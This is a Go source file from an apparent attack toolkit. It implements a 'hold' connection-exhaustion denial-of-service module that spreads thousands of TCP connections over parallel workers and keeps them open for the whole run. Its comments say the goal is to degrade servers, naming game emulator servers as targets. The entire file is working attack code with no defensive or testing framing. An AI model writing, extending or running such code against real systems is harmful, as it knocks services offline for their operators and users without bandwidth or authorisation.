package attack

import (
	"context"
	"net"
	"strconv"
	"sync"
	"sync/atomic"
	"time"
)

// hold opens TCP connections to the target and keeps them open, exhausting the
// server's connection table / accept queue. Game emulators (Hercules & co.)
// spend real CPU per accepted connection, so a few thousand held connections
// degrade the whole server — no bandwidth needed.
type hold struct {
	conns, opened atomic.Int64
	errs          atomic.Uint64
}

func init() { Register("hold", func() Attack { return &hold{} }) }

func (h *hold) Name() string { return "hold" }

func (h *hold) Start(ctx context.Context, opts Options) error {
	total := opts.Conns
	if total <= 0 {
		total = 1000
	}
	dst := net.JoinHostPort(opts.Target.String(), strconv.Itoa(int(opts.Port)))

	workers := opts.Workers
	if workers <= 0 {
		workers = autoWorkers()
	}
	if workers > total {
		workers = total
	}

	var wg sync.WaitGroup
	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func(w int) {
			defer wg.Done()

			start := w * (total / workers)
			end := start + total/workers
			if w == workers-1 {
				end = total // absorb the remainder
			}
			for i := start; i < end; i++ {
				select {
				case <-ctx.Done():
					return
				default:
				}

				c, err := net.DialTimeout("tcp4", dst, 2*time.Second)
				if err != nil {
					h.errs.Add(1) // refused or filtered — expected once the queue is full
					continue
				}
				h.opened.Add(1)
				h.conns.Add(1)

				go func(c net.Conn) {
					<-ctx.Done()
					c.Close()
					h.conns.Add(-1)
				}(c)
			}
		}(w)
	}
	wg.Wait()

	// The dialing pool finishes early; keep the connections held for the
	// full duration (that IS the attack) before returning.
	<-ctx.Done()
	return nil
}

func (h *hold) Stats() Stats {
	return Stats{Conns: h.conns.Load(), Opened: uint64(h.opened.Load()), Errors: h.errs.Load()}
}
